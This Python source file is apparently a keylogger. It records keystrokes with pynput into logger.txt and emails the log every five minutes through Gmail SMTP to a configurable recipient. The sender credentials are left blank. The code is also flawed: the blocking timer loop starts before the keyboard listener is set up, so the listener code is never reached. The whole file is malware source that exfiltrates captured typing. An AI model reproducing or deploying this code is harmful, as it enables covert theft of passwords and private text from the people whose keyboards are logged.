from pynput.keyboard import Key, Listener
import smtplib
from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import time
from timeloop import Timeloop
from datetime import timedelta


# -------------------- Declare SMTP Variables --------------------- #

subject = "Log"
body = "This is the body of the text message"
sender_email = ''
sender_password = ''
recipient_email = ''
smtp_server = 'smtp.gmail.com'
smtp_port = 465
path_to_file = 'logger.txt'

message = MIMEMultipart()
message['Subject'] = subject
message['From'] = sender_email
message['To'] = recipient_email
body_part = MIMEText(body)
message.attach(body_part)

# ---------- Declare an empty list variable to store future keystrokes and a variable to hold the imported Timeloop function ---------- #

keys = []
tl = Timeloop()

# ---------- use decorator to call timeloop function and wrap it around the email function to facilitate sending the logs periodically ---------- #


@tl.job(interval=timedelta(minutes=5))
def emailLog():
        with open(path_to_file,'rb') as file:
            message.attach(MIMEApplication(file.read(), Name="logger.txt"))
        with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, message.as_string())
        print ("2s job current time : {}".format(time.ctime()))

if __name__ == "__main__":
    tl.start(block=True)



# ---------- Create functions to print key strokes to terminal, append to keys list, and write to log file   ---------- #


def onKeyPress(key):
    try: 
        print(key)
    except Exception as ex:
        print('There was an error : ',ex)

        

def onKeyRelease(key):
    global keys
    if key == Key.esc:
        return False
    else:
        if key == Key.enter:
            writeToFile(keys)
            keys=[]
            keys.append(key)
        elif key == Key.space: 
            key = ''
            writeToFile(keys)
            keys=[]
        keys.append(key)


def writeToFile(keys):
    with open('logger.txt', 'a') as file:
        for key in keys:
            key = str(key).replace("'","")
            if 'key'.upper() not in key.upper():
                file.write(key)
        file.write("\n")    


with Listener(on_press=onKeyPress,\
    on_release=onKeyRelease) as listener:
    listener.join()


